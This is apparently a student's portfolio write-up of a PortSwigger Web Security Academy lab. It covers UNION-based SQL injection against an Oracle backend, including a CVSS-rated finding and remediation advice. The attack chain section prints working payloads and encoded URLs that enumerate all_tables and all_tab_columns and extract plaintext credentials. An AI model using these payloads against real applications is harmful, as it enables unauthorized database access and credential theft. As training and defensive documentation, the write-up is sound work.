# SQL Injection — UNION Attack: Oracle Database Enumeration

![Platform](https://img.shields.io/badge/Platform-PortSwigger%20Web%20Security%20Academy-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-yellow)
![Vulnerability](https://img.shields.io/badge/Vulnerability-SQL%20Injection-red)
![Database](https://img.shields.io/badge/Database-Oracle-blue)
![Status](https://img.shields.io/badge/Status-Solved-brightgreen)
![OWASP](https://img.shields.io/badge/OWASP-A03%3A2021%20Injection-critical)
![Author](https://img.shields.io/badge/Author-0x1aerixis-black)

---

## Table of Contents

- [Overview](#overview)
- [Scope and Objectives](#scope-and-objectives)
- [Methodology](#methodology)
- [Attack Chain](#attack-chain)
- [Findings](#findings)
- [Risk Summary](#risk-summary)
- [Tools and Environment](#tools-and-environment)
- [Evidence](#evidence)
- [Remediation Strategy](#remediation-strategy)
- [Lessons Learned](#lessons-learned)
- [References](#references)
- [Author](#author)

---

## Overview

This writeup documents the exploitation of a UNION-based SQL injection vulnerability in the product category filter of a PortSwigger Web Security Academy lab. The target application runs on an Oracle database backend. By chaining four successive injection payloads, full schema and credential enumeration was achieved, resulting in successful authentication as the `administrator` user.

The lab demonstrates a critical weakness in user-supplied input handling: the `category` parameter is passed directly to an SQL query with no sanitization, allowing an attacker to append arbitrary SQL and retrieve data from any accessible table.

---

## Scope and Objectives

| Item | Detail |
|---|---|
| Target | PortSwigger Web Security Academy — Practitioner Lab |
| Lab Title | SQL injection attack, listing the database contents on Oracle |
| Vulnerable Parameter | `category` (GET) |
| Endpoint | `/filter?category=` |
| Database Backend | Oracle |
| Objective | Enumerate schema, extract credentials, authenticate as `administrator` |
| Out of Scope | Any system outside the assigned lab instance |
| Authorization | PortSwigger-authorized lab environment |

---

## Methodology

The engagement followed a structured manual exploitation workflow aligned with **OWASP Testing Guide v4.2 (OTG-INPVAL-005)** and **PTES Technical Guidelines — Vulnerability Analysis phase**.

```
Phase 1 — Column Enumeration
  Determine the number of columns returned by the original query
  Identify which columns accept text (string) data

Phase 2 — Schema Enumeration
  Query Oracle system table all_tables to list accessible tables

Phase 3 — Column Discovery
  Query all_tab_columns to enumerate columns in the target table

Phase 4 — Credential Extraction
  SELECT username and password columns from the identified user table

Phase 5 — Authentication
  Use extracted credentials to log in as administrator
```

---

## Attack Chain

### Step 1 — Column Count and Text Column Identification

**Goal:** Determine how many columns the query returns and which columns hold string data.

Oracle requires a `FROM` clause in every `SELECT` statement. The dual table was used as the Oracle dummy table.

```sql
' UNION SELECT 'abc','def' FROM dual--
```

**Injected URL:**
```
/filter?category=Food+%26+Drink%27+UNION+SELECT+%27abc%27,%27def%27+FROM+dual--
```

**Result:** Two columns returned; both accepted string values. The response rendered the injected strings `abc` and `def`, confirming a two-column result set with text-compatible types in both positions.

---

### Step 2 — Database Table Enumeration

**Goal:** List all tables accessible to the current database user.

In Oracle, `all_tables` contains the names of all tables accessible to the current session.

```sql
' UNION SELECT table_name,NULL FROM all_tables--
```

**Injected URL:**
```
/filter?category=Clothing%2c+shoes+and+accessories%27+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

**Result:** The response returned all accessible table names. The table `USERS_GCPDHZ` was identified as the credential store.

---

### Step 3 — Column Enumeration on Target Table

**Goal:** Identify the exact column names for username and password in `USERS_GCPDHZ`.

Oracle's `all_tab_columns` view holds column metadata for all accessible tables.

```sql
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_GCPDHZ'--
```

**Injected URL:**
```
/filter?category=Clothing%2c+shoes+and+accessories%27%20UNION%20SELECT%20column_name,NULL%20FROM%20all_tab_columns%20WHERE%20table_name=%27USERS_GCPDHZ%27--
```

**Result:** Two columns confirmed: `USERNAME_LLCFHC` and `PASSWORD_UIDEPU`.

---

### Step 4 — Credential Extraction

**Goal:** Retrieve all username and password pairs from `USERS_GCPDHZ`.

```sql
' UNION SELECT USERNAME_LLCFHC,PASSWORD_UIDEPU FROM USERS_GCPDHZ--
```

**Injected URL:**
```
/filter?category=Clothing%2c+shoes+and+accessories%27+UNION+SELECT+USERNAME_LLCFHC,PASSWORD_UIDEPU+FROM+USERS_GCPDHZ--
```

**Result:** The response returned all user credentials in plaintext, including the `administrator` account password.

---

### Step 5 — Authentication

Using the extracted credentials, successful login was achieved as `administrator`, completing the lab objective.

---

## Findings

### FINDING-01 — UNION-Based SQL Injection in Category Filter Parameter

| Field | Detail |
|---|---|
| ID | FINDING-01 |
| Severity | [CRITICAL] |
| CVSS v3.1 Score | 9.8 |
| CVSS Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| CWE | CWE-89 — Improper Neutralization of Special Elements in SQL Command |
| OWASP | A03:2021 — Injection |
| MITRE ATT&CK | T1190 — Exploit Public-Facing Application |
| Affected Component | `GET /filter?category=` |
| Database | Oracle |

**Description**

The `category` query parameter is concatenated directly into an SQL query without sanitization or parameterization. An unauthenticated attacker can inject arbitrary SQL syntax, including `UNION SELECT` statements, to read data from any table accessible to the database user running the application.

**Technical Impact**

- Full read access to all Oracle tables accessible to the application's database account, including `all_tables` and `all_tab_columns`
- Extraction of plaintext credentials from the `USERS_GCPDHZ` table
- Horizontal and vertical privilege escalation via credential reuse

**Business Impact**

- Unauthorized access to all user accounts, including administrative accounts
- Complete compromise of application confidentiality
- Potential for lateral movement if credentials are reused across systems
- Regulatory exposure under applicable data protection frameworks (GDPR, NDPA)

**Proof of Concept**

```
Request:
GET /filter?category=Food+%26+Drink%27+UNION+SELECT+%27abc%27,%27def%27+FROM+dual-- HTTP/1.1

Response: HTTP 200 — injected strings 'abc' and 'def' rendered in product listing
```

**Reproduction Steps**

1. Navigate to any product category page
2. Append a single quote to the `category` parameter — observe an error or behavioural change
3. Inject `' UNION SELECT 'abc','def' FROM dual--` to confirm column count
4. Enumerate `all_tables` to identify credential tables
5. Enumerate `all_tab_columns` for target table column names
6. Extract credentials with `UNION SELECT username_col, password_col FROM target_table--`

---

## Risk Summary

| ID | Title | Severity | CVSS | Status |
|---|---|---|---|---|
| FINDING-01 | UNION-Based SQL Injection — Category Filter | [CRITICAL] | 9.8 | Confirmed / Exploited |

---

## Tools and Environment

| Tool / Resource | Purpose |
|---|---|
| Browser (manual URL manipulation) | Payload delivery |
| PortSwigger Web Security Academy | Authorized lab platform |
| Oracle `dual` table | Dummy table for UNION SELECT compatibility |
| Oracle `all_tables` | Schema enumeration |
| Oracle `all_tab_columns` | Column enumeration |

---

## Evidence

| File | Description |
|---|---|
| `lab-solved.png` | Lab completion confirmation screen |
| `Admin cred.png` | Extracted administrator credentials from UNION SELECT output |
| `password column.png` | Column enumeration result — USERNAME_LLCFHC and PASSWORD_UIDEPU confirmed |
| `list of tables in the database.png` | all_tables UNION SELECT output — USERS_GCPDHZ identified |

> Screenshots are located in the `/evidence/` directory of this repository.

---

## Remediation Strategy

### REM-01 — Parameterized Queries [IMMEDIATE]

Replace all dynamic SQL string concatenation with parameterized queries or prepared statements. This is the primary and most effective control.

```java
// Vulnerable pattern
String query = "SELECT * FROM products WHERE category = '" + category + "'";

// Secure pattern
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM products WHERE category = ?"
);
stmt.setString(1, category);
```

**Retest Criteria:** Injecting `' UNION SELECT 'a','b' FROM dual--` must return an error or empty result, with no injected data rendered in the response.

---

### REM-02 — Least Privilege Database Account [SHORT-TERM]

The application's database user should have `SELECT` access only on the specific tables required for application functionality. Access to Oracle system views (`all_tables`, `all_tab_columns`, `all_tab_privs`) should be revoked.

```sql
REVOKE SELECT ON all_tables FROM app_user;
REVOKE SELECT ON all_tab_columns FROM app_user;
```

**Retest Criteria:** Step 2 and Step 3 of the attack chain must return no rows when executed with the restricted account.

---

### REM-03 — Input Validation [SHORT-TERM]

Implement allowlist validation on the `category` parameter. Reject any input containing SQL metacharacters (`'`, `--`, `UNION`, `SELECT`) at the application layer before the value reaches the data access layer.

---

### REM-04 — Plaintext Password Storage [IMMEDIATE]

Credentials must not be stored in plaintext. Implement a strong adaptive hashing algorithm such as bcrypt (cost factor >= 12) or Argon2id for all stored passwords.

---

### REM-05 — Web Application Firewall [PLANNED]

Deploy a WAF rule set covering OWASP CRS (Core Rule Set) to detect and block common SQL injection patterns as a defence-in-depth control. WAF alone is not a substitute for parameterized queries.

---

## Lessons Learned

**Oracle-Specific Syntax Requirements**

Unlike MySQL or PostgreSQL, Oracle requires every `SELECT` statement to include a `FROM` clause. The `dual` table serves as the standard Oracle dummy table for injection payloads that do not target a real table. Failure to account for this syntax requirement will produce errors rather than results.

**System View Enumeration as a Recon Primitive**

`all_tables` and `all_tab_columns` are the Oracle equivalents of `information_schema.tables` and `information_schema.columns` in MySQL/PostgreSQL. Awareness of database-specific schema views is a prerequisite for effective UNION-based enumeration across heterogeneous environments.

**Column Count Verification Before UNION Injection**

A UNION SELECT must return exactly the same number of columns as the original query. Injecting into a two-column result set with a three-column UNION payload will produce a runtime error rather than data. Always confirm column count before proceeding to data extraction.

---

## References

| Resource | Link |
|---|---|
| OWASP Testing Guide v4.2 — OTG-INPVAL-005 | https://owasp.org/www-project-web-security-testing-guide/ |
| CWE-89: SQL Injection | https://cwe.mitre.org/data/definitions/89.html |
| MITRE ATT&CK T1190 | https://attack.mitre.org/techniques/T1190/ |
| PortSwigger SQL Injection Cheat Sheet | https://portswigger.net/web-security/sql-injection/cheat-sheet |
| Oracle all_tables Reference | https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html |
| Oracle all_tab_columns Reference | https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TAB_COLUMNS.html |
| CVSS v3.1 Calculator | https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator |
| PortSwigger Lab — Oracle DB Enumeration | https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle |

---

## Author

**Michael Asante Anim** | `0x1aerixis`
BSc Cyber Security — University of Mines and Technology (UMaT), Tarkwa, Ghana

[![GitHub](https://img.shields.io/badge/GitHub-anim--michael--asante-black?logo=github)](https://github.com/anim-michael-asante)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue?logo=linkedin)](https://linkedin.com/in/michael-asante-anim)
[![TryHackMe](https://img.shields.io/badge/TryHackMe-0x1aerixis-red?logo=tryhackme)](https://tryhackme.com/p/0x1aerixis)
[![X](https://img.shields.io/badge/X-0x1aerixis-black?logo=x)](https://x.com/0x1aerixis)
[![Discord](https://img.shields.io/badge/Discord-0x1aerixis-5865F2?logo=discord)](https://discord.com/users/0x1aerixis)

> *"Built in the lab. Documented for the field."*

---
> **Disclaimer:** All work documented in this repository was conducted in authorized, isolated
> lab environments or sanctioned CTF platforms. No unauthorized systems were accessed.
> This project is intended for educational and portfolio purposes only.
